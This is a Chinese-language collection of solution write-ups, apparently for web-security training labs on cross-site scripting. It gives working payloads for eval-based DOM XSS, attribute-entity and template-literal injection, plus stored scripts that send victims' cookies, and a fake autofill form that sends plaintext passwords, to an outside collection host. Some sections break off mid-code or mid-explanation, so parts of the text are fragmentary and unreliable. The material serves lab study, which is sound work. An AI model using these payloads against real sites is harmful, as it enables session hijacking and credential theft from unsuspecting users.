- **`fetch('/guestbook', ...)`**：发起 HTTP 请求。`/guestbook` 是相对于当前站点根目录的地址，例如页面在 `https://example.com/a`，请求就会发往 `https://example.com/guestbook`。

- **`Content-Type: application/x-www-form-urlencoded`**：告诉服务器，请求体采用普通表单的编码格式，即 `字段名=字段值`。
  
- **`document.cookie`**：读取当前页面可访问、且没有设置 `HttpOnly` 的 Cookie，结果是字符串。
  
- **`encodeURIComponent(...)`**：对字符串进行 URL 编码，防止 Cookie 中的 `&`、`=` 等字符干扰表单解析。
  
- **`'content=' + ...`**：把编码后的 Cookie 放进名为 `content` 的表单字段。

### Reflected DOM XSS

##### 第一步：在页面操作并抓包观察

1. 打开靶场，在搜索框输入 `hello`，点击 **Search**。
  
2. 按 `F12` 打开开发者工具，切换到 **Network（网络）** 面板（或者用 Burp Suite）。
  
3. 发现页面没有全局刷新，而是发出了一个异步 AJAX 请求：
  

```
GET /search-results?search=hello
```

4. 点击这个请求，查看它的 **Response（响应体）**，返回的是一段 JSON：

```
{"results":[],"searchTerm":"hello"}
```

**现象**：我们输入的搜索词，被后端原样反射放进了 JSON 的 `searchTerm` 字段中。

##### 第二步：审计前端 JavaScript 源码（寻找 Sink）

1. 在 F12 的 **Sources（源代码）** 或在网页中找到引用的脚本：`/resources/js/searchResults.js`。
  
2. 查看关键代码段：
  

```
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path, true);
    xhr.send();
}
```

3. **发现严重隐患**：
  

- 前端接收到后端的 `this.responseText` 后，没有使用安全的 `JSON.parse()`，而是用了**eval**:`eval('var searchResultsObj = ' + this.responseText);`
  
- 意味着：**只要后端的响应文本能被我们控制并破坏原有语法，就能在 `eval` 中执行任意 JS 代码。**
  

##### 第三步：测试后端的转义机制

既然在 `eval('var searchResultsObj = ' + this.responseText)` 中，我们的输入目前是在双引号内：`"searchTerm":"输入内容"`。

1. **测试直接闭合双引号**：
  

- 搜索框输入：`test"`
  
- 查看响应体：
  

```
{"results":[],"searchTerm":"test\""}
```

- **分析**：后端把 `"` 自动转义成了 `\"`，双引号失效，无法逃逸字符串。
  

2. **测试转义符本身的过滤情况**：
  

- 搜索框输入：`test\"`
  
- 查看响应体：
  

```
{"results":[],"searchTerm":"test\\""}
```

- **关键发现**：后端把 `"` 变成了 `\"`，但**对前面的反斜杠 `\` 没做任何处理**！

##### 第四步：“反斜杠逃逸”机制

在 JavaScript / JSON 的语法解析中：

- 单个 `\` 是转义字符；
  
- 两个连续的反斜杠 `\\` 会被解析成 **一个纯文本的反斜杠字符**，转义功能就此被消耗。
  

因此对于 `searchTerm":"test\\""`：

- 前面的 `\\` 解析为字符 `\`；
  
- 后面的 `"` **失去转义保护，恢复了作为字符串闭合符号的身份！**
  

##### 第五步：组装完整 Payload 并修复语法

我们现在的目标是让整个字符串在 `eval()` 里是一个**合法的 JavaScript 语句**：

原始代码模板：

```
var searchResultsObj = {"results":[],"searchTerm":"【这里是输入】"};
```

我们输入：

```
\"-alert(1)}//
```

1. **`\"`**：后端转为 `\\"`，闭合字符串：`"searchTerm":"\\"`。

### Reflected XSS in canonical link tag

##### 一、漏洞成因与限制分析

1. **注入位置**：
  
  访问网站首页，查看网页源码，在 `<head>` 区域能找到规范链接标签：

  ```
  
2. **过滤机制**：
  
  - 尖括号 `<` 和 `>` 被 HTML 实体编码，**无法闭合 `<link>` 标签去新建 `<script>` 或 `<img>`**。
  - 但**单引号 `'` 没有被转义**，可以直接闭合 `href` 属性并注入新属性。
3. **难点**：
  
  - `<link>` 标签在 `<head>` 内部，不会在页面上渲染出任何可见图形，常规的 `onmouseover` 或用户鼠标点击无法触碰它。

| 常见思路 | 尝试注入的代码 | 为什么失效？ |
| --- | --- | --- |
| **加载报错法** | `' onerror='alert(1)` | `<link rel="canonical">` 只是个静态的元数据说明标签，浏览器根本不会去“拉取并渲染”它，**不会产生加载成功/失败过程**，因此 `onload` 和 `onerror` 从来不会被触发。 |
| **鼠标悬停法** | `'onmouseover='alert(1)` | `<link>` 标签在 `<head>` 区域，浏览器在页面上**根本不给它分配任何坐标、宽高（完全隐形且不占位）**。用户的鼠标在屏幕上怎么晃，物理上都触碰不到一个没有尺寸和坐标的元素。 |
| **自动聚焦法** | `' autofocus onfocus='alert(1)` | 现代浏览器有安全限制：`<head>` 里的不可见标签属于非交互组件，浏览器默认**禁止把键盘焦点自动给到不可见元素**，`autofocus` 直接被静默忽略。 |

- `accesskey='x'`：将按键 `x` 绑定为此元素的激活键。

### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

##### 一、漏洞定位与代码分析

进入任意一篇博客文章，在评论区发表一条评论：

```

###### 后端防御测试：

- 在 Website 字段测试 `'`：被转义为 `\'`，无法逃逸字符串。
- 测试 `\`：被转义为 `\\`，无法像之前那样靠反斜杠抵消转义符。
- 测试 `"` 或 `<>`：被转义为 `&quot;` 和 `&lt;&gt;`，无法闭合 `onclick` 属性。

##### 二、利用 HTML 实体编码 `&apos;`

###### 浏览器的底层解析顺序：

当浏览器处理 `<a onclick="...">` 这段代码时，遵循严格的**两阶段解析机制**：

1. **第一阶段（HTML 解析器处理属性）**：
  - 浏览器解析 HTML 属性值时，**会自动对其中的 HTML 实体进行解码**！
  - 例如：属性里的 `&apos;` 会被还原成字符 `'`，`&quot;` 会被还原成 `"`。
2. **第二阶段（JavaScript 解释器执行代码）**：
  - 当用户点击链接触发 `onclick` 时，JS 引擎拿到的是**已经被 HTML 解码后的纯字符串**。

###### 为什么能绕过服务端的过滤？

- 服务端只针对直接输入的字面量 `'` 和 `\` 进行了黑名单转义。
- 当我们提交 **`&apos;`**（单引号的 HTML 实体名）时，服务端认为它只是一串普通的字母符号，**不会对其进行转义**，原样存入数据库。
- 数据渲染到页面属性中后，浏览器在第一阶段把 `&apos;` 还原为真正的单引号 `'`，而在第二阶段交由 JS 引擎执行时，成功闭合了字符串！

##### 三、Payload 构造

在评论的 **Website** 字段输入：

```text
http://foo?&apos;-alert(1)-&apos;
```

*(或者：`http://example.com?&apos;-alert(1)-&apos;`)*

##### 四、Payload 逐段解析

当代码被拼接进页面后，初始 HTML 源码长这样：

```html
<a href="..." onclick="...tracker.track('http://foo?&apos;-alert(1)-&apos;');">
```

当浏览器解析该元素并准备执行时，`&apos;` 被解码为 `'`，实际执行的 JS 为：

```javascript
...tracker.track('http://foo?'-alert(1)-'');
```

- **`http://foo?`**：作为前半段普通的字符串。
- **`&apos;`**（解码为 `'`）：闭合前半段字符串。
- **`-alert(1)`**：JS 执行减法运算，为了计算表达式的值**优先执行 `alert(1)` 弹窗**。
- **`-`**：与后半段连接。
- **`&apos;`**（解码为 `'`）：**重新开启一个单引号**，将原本末尾遗留的 `');` 包裹为合法的字符串，保证整行 JS 语法完全正确无报错。

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

##### 一、漏洞探测与防御分析

###### 1. 观察注入上下文

在搜索框输入 `test123`，查看页面源码，发现输入反射在 `<script>` 标签中的 **ES6 模板字符串** 内：

```html
<script>
    var message = `0 search results for 'test123'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

###### 2. 测试后端的防御机制

- 测试 `< >`：被 HTML 实体编码为 `&lt;&gt;`，无法新建或闭合 `<script>`。
- 测试 `'`、`"`：被编码或转义，无法闭合字符串。
- 测试 `\`：被转义，无法用于抵消转义符。
- 测试反引号 `` ` ``**：后端将其替换为 Unicode 转义形式（如 `\u0060`），**无法闭合外层的反引号。

##### 二、破局思路：利用 `${...}` 原生表达式插值

这是 ES6 规范给 JavaScript 带来的原生特性：

- 在普通字符串（`'...'` 或 `"..."`）中，`${alert(1)}` 只是几个普通字符；
- 但在**反引号（`` `...` ``）包裹的模板字符串**中，**`${}` 会被 JS 引擎当作可执行的代码表达式求值！**

也就是说：**我们压根不需要逃逸或闭合模板字符串，直接在字符串内部写 `${代码}` 就能就地执行！**

##### 三、解题 Payload

直接在搜索框中输入：

```javascript
${alert(1)}
```

##### 四、代码执行过程拆解

提交该 Payload 后，后端原封不动地将其拼入页面，生成的最终 JavaScript 代码如下：

```javascript
var message = `0 search results for '${alert(1)}'`;
```

###### JS 引擎的解析顺序：

1. 浏览器解析执行该 JavaScript 脚本，遇到反引号包裹的模板字符串。
2. 解析器识别到占位符语法 **`${...}`**。
3. **立即中断当前字符串拼接，优先计算括号内的表达式 `alert(1)`**。
4. 页面成功弹出 `alert(1)` 弹窗！
5. 弹窗关闭后，`alert(1)` 的返回值（`undefined`）被转为字符串填充进原位置（变为 `0 search results for 'undefined'`），整个过程没有任何语法报错。

##### 五、通关步骤

1. 打开靶场搜索框，输入 `${alert(1)}`。
2. 回车搜索，页面立即弹窗，实验通关。

### Exploiting cross-site scripting to steal cookies

##### 一、利用链路

1. **注入 Payload**：在博客评论区提交一段 JavaScript，让访问者在后台偷偷将自身的 Cookie 发送到我们的接收服务器。
2. **受害者访问**：靶场后台机器人会定期访问文章查看最新评论，自动执行我们注入的代码。
3. **数据外带**：机器人访问时，其 Session Cookie 被打包并发送到 Burp Collaborator。
4. **会话劫持**：在 Collaborator 拿到受害者的 `session` 值，在浏览器中替换自己的 Cookie 并刷新页面，成功登录受害者账号通关。

##### 二、解题 Payload

使用 `fetch` 将 Cookie 作为请求体发送给 Burp Collaborator：

```html
<script>
fetch('https://YOUR-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

*(注意：也可以用 `new Image().src = 'https://YOUR-COLLABORATOR-SUBDOMAIN?' + document.cookie;`)*

##### 三、详细解题步骤

###### 第一步：获取 Burp Collaborator 地址

1. 打开 Burp Suite Professional，进入顶部菜单 **Collaborator**。
2. 点击 **Copy to clipboard** 复制专属二级域名（形如 `xxxx.oastify.com`）。

###### 第二步：提交恶意评论

1. 进入靶场任意文章的评论区。
2. 将上述 Payload 粘贴在 **Comment** 输入框中，并将 `YOUR-COLLABORATOR-SUBDOMAIN` 替换为你刚复制的 Collaborator 域名。
3. 其余 Name / Email / Website 随意填写合规格式，点击 **Post Comment** 提交。

##### 第三步：查看并捕获 Cookie

1. 返回 Burp Suite 的 Collaborator 面板，点击 **Poll now**。
  
2. 稍等片刻，会收到一条来自后台机器人的 HTTP POST 请求。
  
3. 点击该请求查看 **Request body**，可以看到类似数据：
  
  ```text
  secret=...; session=XYZ123456789...
  ```
  
4. 复制其中的 `session` 值。
  

##### 第四步：会话替换与通关

1. 回到靶场网页，按 `F12` -> 切换到 **Application（应用）** 标签页。
2. 在左侧菜单展开 **Cookies**，选中当前靶场域名。
3. 找到 `session` 字段，将其 **Value** 双击替换为刚刚偷到的受害者 `session` 字符串。
4. 按 `F5` 刷新页面（或点击首页 Home），页面识别为受害者身份登录，靶场判定通关。

### Exploiting cross-site scripting to capture passwords

##### 一、题目考点与核心原理

1. **为什么偷密码而不是偷 Cookie？**
  
  在许多真实场景下，网站的敏感会话 Cookie 会设置 **`HttpOnly`** 属性，导致 JavaScript 无法通过 `document.cookie` 读取到它。
  
2. **利用浏览器的“密码自动填充”机制（Autofill Abuse）**：
  
  - 大多数主流浏览器（如 Chrome、Firefox）都内置了密码管理功能，当用户在某网站保存过密码后，只要网页中出现 `<input name=username>` 和 `<input type=password>`，**浏览器就会误以为这是登录表单，并自动将保存的账密填入其中**。
  - 自动填充会触发 `onchange` 事件，我们在此事件中读取输入框的值，即可把受害者的**账号和明文密码**直接外带出来！

##### 二、解题 Payload

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://你的Collaborator域名',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
```

###### 代码拆解：

- **`<input name=username id=username>`**：构造虚假的账号输入框，诱导浏览器自动填入用户名。
- **`<input type=password name=password ...>`**：构造密码输入框，诱导浏览器自动填入密码。
- **`onchange="..."`**：当浏览器自动填充密码时触发。
- **`body: username.value + ':' + this.value`**：读取账号和密码，以 `账号:密码` 的格式通过 POST 发送到 Collaborator。

##### 三、详细解题步骤

###### 第一步：在 BP 中获取专属外带地址

1. 打开 Burp Suite 专业版，切换到 **【Collaborator 客户端】**（或 **【协同器】**）。
2. 点击右侧 **【复制到剪贴板】** 拿到外带域名（例如 `xxxx.oastify.com`）。

###### 第二步：在博客评论区注入表单

1. 打开任意博客文章，滑到底部评论区。
2. 在 **Comment** 输入框中粘贴上面的 Payload（**替换为你自己的 Collaborator 域名**）。
3. Name / Email / Website 随意填写合规格式，点击 **Post comment** 提交。

###### 第三步：捕获受害者的明文账密

1. 回到 BP 的 Collaborator 页面，等待 10~20 秒，点击 **【立即轮询（Poll now）】**。
  
2. 在刷新出的列表中找到类型（Type）为 **`HTTP`** 的请求行并点击。
  
3. 在下方窗口中查看 **【请求（Request）】** 面板，滑到最底部的 **正文（Body）区域**，就能看到受害者自动发过来的明文账密：
  
  ```text
  administrator:P@ssw0rd123...
  ```
  
4. 记录下冒号后面的密码字符串。
  

###### 第四步：使用账号密码登录通关

1. 回到靶场网页，点击顶部导航栏的 **My account** 进入登录页面。
2. 输入刚才捕获的凭证：
  - **Username**: `administrator`
  - **Password**: 刚才在 BP 偷到的密码
3. 点击 **Log in** 登录，管理员登录成功，靶场自动判定通关！
